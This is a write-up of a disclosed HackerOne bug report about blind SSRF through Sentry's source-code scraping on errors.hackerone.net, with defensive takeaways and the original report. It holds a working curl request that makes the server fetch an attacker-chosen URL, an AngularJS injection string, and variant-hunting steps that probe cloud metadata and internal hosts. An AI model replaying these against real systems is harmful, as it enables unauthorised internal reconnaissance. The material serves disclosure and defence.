# Blind SSRF on errors.hackerone.net due to Sentry misconfiguration

## Metadata
- **Source:** HackerOne
- **Report:** 374737 | https://hackerone.com/reports/374737
- **Submitted:** 2018-06-30
- **Reporter:** chaosbolt
- **Program:** HackerOne
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Server-Side Request Forgery (SSRF), Misconfiguration, Information Disclosure
- **CVEs:** None
- **Category:** web-api

## Summary
Sentry's source code scraping feature was enabled on errors.hackerone.net, allowing attackers to craft malicious error reports with arbitrary URLs in the 'filename' parameter. This caused the Sentry server to make blind GET requests to attacker-controlled domains, including potential internal network resources.

## Attack scenario
1. Attacker discovers errors.hackerone.net uses Sentry for error reporting via CSP headers and sentry_key parameter
2. Attacker identifies the /api/30/store/ endpoint accepts malformed error reports with stacktrace data
3. Attacker crafts a POST request with a malicious 'filename' parameter pointing to attacker-controlled domain
4. Sentry's source code scraping feature processes the error and makes a blind GET request to the attacker's URL
5. Attacker receives callback from 54.186.141.19 (HackerOne infrastructure IP), confirming SSRF capability
6. Attacker could pivot to scan internal network, access cloud metadata endpoints, or exfiltrate sensitive information

## Root cause
Sentry's 'source code scraping' feature was enabled without proper validation of the 'filename' parameter in error reports. The application blindly fetches URLs specified in stack traces without verifying they are legitimate source files or implementing SSRF protections (IP whitelisting, internal network blocking).

## Attacker mindset
Discovery-focused reconnaissance: identified public Sentry integration from CSP headers, researched Sentry's documented features, and tested known feature exploitation paths. Low-risk testing approach using callback validation rather than direct exploitation.

## Defensive takeaways
- Disable Sentry's source code scraping feature unless absolutely necessary
- Implement URL validation and sanitization for any user-controlled parameters that trigger server-side requests
- Use SSRF protection mechanisms: IP whitelisting, internal network range blocking (10.0.0.0/8, 169.254.0.0/16 for cloud metadata)
- Validate that 'filename' parameters in error reports match expected patterns (same origin, approved domains)
- Regularly audit third-party service configurations for security-impacting settings
- Implement network segmentation to limit blast radius of SSRF vulnerabilities
- Monitor outbound requests from error handling services for anomalous patterns

## Variant hunting
Check for similar SSRF via other stack trace fields (url, request.url, breadcrumb paths)
Test other Sentry API endpoints for parameter injection (/api/*/projects/*, /api/*/releases/*)
Audit other error tracking services (Rollbar, Bugsnag, New Relic) for identical misconfiguration patterns
Search for internal applications using Sentry with source scraping enabled
Test if attacker can exfiltrate actual source code or access cloud metadata (169.254.169.254)
Investigate if SSRF can reach internal services on non-standard ports

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1046 - Network Service Discovery
- T1526 - Scan Infrastructure
- T1552 - Unsecured Credentials
- T1619 - Cloud Storage Object Discovery

## Notes
The report demonstrates sophisticated reconnaissance methodology by identifying the Sentry integration through CSP headers. The vulnerability is a classic misconfiguration vulnerability rather than a code defect. The attacker's caution about the IP potentially being 'firewalled' shows good operational security awareness. This is a practical example of how third-party service integrations can introduce unexpected attack surface. The public sentry_key exposure enables unauthenticated exploitation.

## Full report
<details><summary>Expand</summary>

**Summary:**
When setting up Sentry you should turn off "source code scrapping". If it is turned on, then server that has Sentry on it will make blind get requests everywhere controlled from outside via error reporting.

**Description:**
Hello Hackerone team. In your CSP I found ?sentry_key parameter, so it is obivious that you are using sentry to handle CSP reports. The regular route was 
```
POST /api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
```
However, you also can receive UI bug reports on different endpoint. Here it is:
```
POST /api/30/store/?sentry_version=7&sentry_client=raven-js%2F3.25.2&sentry_key=61c1e2f50d21487c97a071737701f598
```
And here I remember that if Sentry "source code scrapping" is turned on, then server makes blind GET request to URL defined in "filename" parameter. Even inside intranet. So I tried to simulate error report with malformed "filename" parameter and got callback on my website from 54.186.141.19 IP. I am not 100% sure that it is not firewalled host, but lets try my luck with this report :)


### Steps To Reproduce

1. replace avtohanter.ru in following curl:
```
curl -i -s -k  -X $'POST' \
    -H $'Host: errors.hackerone.net' -H $'Connection: close' -H $'Content-Length: 9031' -H $'Origin: https://hackerone.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' -H $'Content-Type: application/csp-report' -H $'Accept: */*' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7' \
    --data-binary $'{\"project\":\"30\",\"logger\":\"javascript\",\"platform\":\"javascript\",\"request\":{\"headers\":{\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\",\"Referer\":\"https://avtohanter.ru/Business/Contractors/ContractorInfo?sessionid=40030075&id=da89ae9a-b2b7-4412-a5b0-6764f0c6556c\"},\"url\":\"https://avtohanter.ru/Business/Contractors/EditContractor?id=da89ae9a-b2b7-4412-a5b0-6764f0c6556c&sessionId=40030075\"},\"exception\":{\"values\":[{\"type\":\"Error\",\"value\":\"Trying to get control scope but angular isn\'t ready yet or something like this\",\"stacktrace\":{\"frames\":[{\"filename\":\"https://avtohanter.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js\",\"lineno\":110,\"colno\":81071,\"function\":\"XMLHttpRequest.o\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js\",\"lineno\":96,\"colno\":75069,\"function\":\"XMLHttpRequest.<anonymous>\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js\",\"lineno\":96,\"colno\":71510,\"function\":\"k\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js\",\"lineno\":96,\"colno\":23681,\"function\":\"Object.fireWith [as resolveWith]\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js\",\"lineno\":96,\"colno\":22924,\"function\":\"s\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/PrimaryMaster.bundle.7991fcfb2a87637dbcc8.js\",\"lineno\":1,\"colno\":724721,\"function\":\"Object.n.(anonymous function) [as success]\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/PrimaryMaster.bundle.7991fcfb2a87637dbcc8.js\",\"lineno\":1,\"colno\":725795,\"function\":\"Object.n.success\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":757703,\"function\":\"Object.executeInContext\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/PrimaryMaster.bundle.7991fcfb2a87637dbcc8.js\",\"lineno\":1,\"colno\":725917,\"function\":\"?\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/PrimaryMaster.bundle.7991fcfb2a87637dbcc8.js\",\"lineno\":1,\"colno\":723970,\"function\":\"c.json.c.toLowerCase.n.success.n.success\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/Business/Contractors/EditContractor?id=da89ae9a-b2b7-4412-a5b0-6764f0c6556c&sessionId=40030075\",\"lineno\":2446,\"colno\":299,\"function\":\"ajaxOptions.success\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":313620,\"function\":\"NotificationCenter.<anonymous>\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":316137,\"function\":\"NotificationCenterDropdown.setValue\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":542056,\"function\":\"NotificationCenterDropdown.setValue\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":665829,\"function\":\"NotificationCenterDropdown.setValue\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":666057,\"function\":\"NotificationCenterDropdown._scatter\",\"in_app\":true},{\"filename\":\"<anonymous>\",\"lineno\":null,\"colno\":null,\"function\":\"Array.forEach\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":666079,\"function\":\"?\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":714602,\"function\":\"ListClientBinding.output\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":713050,\"function\":\"ListClientBinding.output\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":448313,\"function\":\"NotificationCenterOuterList.setValue\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"lineno\":1,\"colno\":683081,\"function\":\"NotificationCenterOuterList.getScope\",\"in_app\":true}]}}]},\"transaction\":\"https://avtohanter.ru/dist/commons.bundle.a2d5b6c7d2ffda1c006f.js\",\"trimHeadFrames\":0,\"tags\":{\"AbonentId\":\"36053ca1-a898-43e3-90be-2bf69232bcf0\",\"UserId\":\"36053ca1-a898-43e3-90be-2bf69232bcf0\",\"OrganizationId\":\"c344ad73-f374-4bef-8629-8ebe1ebea57e\"},\"extra\":{\"session:duration\":357},\"breadcrumbs\":{\"values\":[{\"timestamp\":1530367897.368,\"category\":\"sentry\",\"message\":\"$parse:lexerr: Lexer Error: Unterminated quote at columns 47-67 [\'x=1} } };alert(1));] in expression [\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=1} } };alert(1));].\",\"event_id\":\"57575ae92ea2477d8ba3665017601f81\",\"level\":\"error\"},{\"timestamp\":1530367897.373,\"message\":\"Error: [$parse:lexerr] Lexer Error: Unterminated quote at columns 47-67 [\'x=1} } };alert(1));] in expression [\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=1} } };alert(1));].\\nhttp://errors.angularjs.org/1.5.8/$parse/lexerr?p0=Unterminated%20quote&p1=s%2047-67%20%5B\'x%3D1%7D%20%7D%20%7D%3Balert(1))%3B%5D&p2=\'a\'.constructor.prototype.charAt%3D%5B%5D.join%3B%24eval(\'x%3D1%7D%20%7D%20%7D%3Balert(1))%3B\\n    at https://elba.kontur.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js:58:365\\n    at hr.throwError (https://elba.kontur.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js:58:75995)\\n    at hr.readString (https://elba.kontur.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js:58:77352)\\n    at hr.lex (https://elba.kontur.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js:58:74150)\\n    at vr.ast (https://elba.kontur.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js:58:80676)\\n    at Er.compile (https://elba.kontur.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js:58:85908)\\n    at Or.parse (https://elba.kontur.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js:58:100573)\\n    at c (https://elba.kontur.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js:58:101408)\\n    at p (https://elba.kontur.ru

</details>

---
*Analysed by Claude on 2026-05-11*
